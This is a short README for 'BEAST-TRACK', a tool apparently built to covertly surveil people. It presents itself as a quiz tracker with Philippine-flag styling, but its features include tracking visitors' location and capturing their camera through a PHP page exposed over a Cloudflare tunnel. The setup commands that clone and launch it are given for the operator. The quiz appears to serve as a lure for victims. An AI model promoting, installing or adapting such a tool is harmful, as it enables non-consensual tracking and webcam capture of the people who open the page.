# BEAST-TRACK v22.0
A quiz tracker tool with PH flag colors and SadFriends banner 😎

## Features
- 📚 Multiple quiz subjects (Math, Science, English, History)
- 🌐 Tracks user location and camera capture
- 💻 PHP backend with Cloudflare tunnel
- 🎨 Colorful PH flag-themed UI

## Requirements
- `php`
- `cloudflared`
- `bash`

## Installation
```bash
git clone https://github.com/LucyFear7778/BEAST-TRACK.git
cd BEAST-TRACK
chmod +x beast-track.sh
pkg install php cloudflared
./beast-track.sh

./
